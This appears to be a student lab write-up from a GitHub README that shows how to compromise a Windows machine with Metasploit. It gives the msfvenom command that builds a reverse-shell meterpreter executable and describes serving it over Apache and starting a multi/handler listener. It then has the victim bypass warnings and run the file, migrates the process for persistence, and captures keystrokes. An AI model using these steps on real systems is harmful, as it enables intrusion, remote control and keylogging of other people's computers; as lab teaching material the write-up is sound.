# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig


![image](https://github.com/srinivasanvaiyali/Compromising-windows-using-Metasploit/assets/145117665/cf251bc1-fc86-4b15-b5d9-29fa31ffebcb)

malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe.

![image](https://github.com/srinivasanvaiyali/Compromising-windows-using-Metasploit/assets/145117665/458c846c-2619-416a-8749-a64012abceb8)

the fun.exe into the apache /var/www/html folder

![image](https://github.com/srinivasanvaiyali/Compromising-windows-using-Metasploit/assets/145117665/976a0f17-441e-4eb6-b2de-8ba013918dfe)

Start apache server sudo systemctl apache2 start

![image](https://github.com/srinivasanvaiyali/Compromising-windows-using-Metasploit/assets/145117665/7cd3ca21-3d30-43c6-a305-120df534dae1)

Check the status of apache2 Invoke msfconsole: msfconsole

![image](https://github.com/srinivasanvaiyali/Compromising-windows-using-Metasploit/assets/145117665/e5635700-4693-403d-931c-cfe3b705bba3)



![image](https://github.com/srinivasanvaiyali/Compromising-windows-using-Metasploit/assets/145117665/82c638bb-7046-4398-8aa2-dfb8165d27f5)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![image](https://github.com/srinivasanvaiyali/Compromising-windows-using-Metasploit/assets/145117665/30fd8cf0-e825-401c-9c93-c60489800055)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit css

![image](https://github.com/srinivasanvaiyali/Compromising-windows-using-Metasploit/assets/145117665/190f6175-71bb-4ed8-8ecb-70e691a0b1c7)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads

![image](https://github.com/srinivasanvaiyali/Compromising-windows-using-Metasploit/assets/145117665/b85393dd-bad8-41a3-9c75-f276c8c23ed0)

Bypass any warning boxes, double-click the file, and allow it to run.

![image](https://github.com/srinivasanvaiyali/Compromising-windows-using-Metasploit/assets/145117665/2dc24573-f7dc-49b1-8e67-2345e613ccaf)

On kali give the command exploit

![image](https://github.com/srinivasanvaiyali/Compromising-windows-using-Metasploit/assets/145117665/e5d3d197-215f-4aac-889e-afda3291b4cc)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156


![image](https://github.com/srinivasanvaiyali/Compromising-windows-using-Metasploit/assets/145117665/539dec42-4904-428d-9614-425c9f4c763f)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command: migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted.

![image](https://github.com/srinivasanvaiyali/Compromising-windows-using-Metasploit/assets/145117665/78b2c83e-1f00-4565-98c5-dd41777ae904)

Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name. 

![image](https://github.com/srinivasanvaiyali/Compromising-windows-using-Metasploit/assets/145117665/6fc39d4b-5c86-42f6-a66c-0b37f958f4f9)

the keystrokes captured so far.

![image](https://github.com/srinivasanvaiyali/Compromising-windows-using-Metasploit/assets/145117665/ed2aa6a6-5a0b-4cd4-b078-e7fe7e0058ed)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
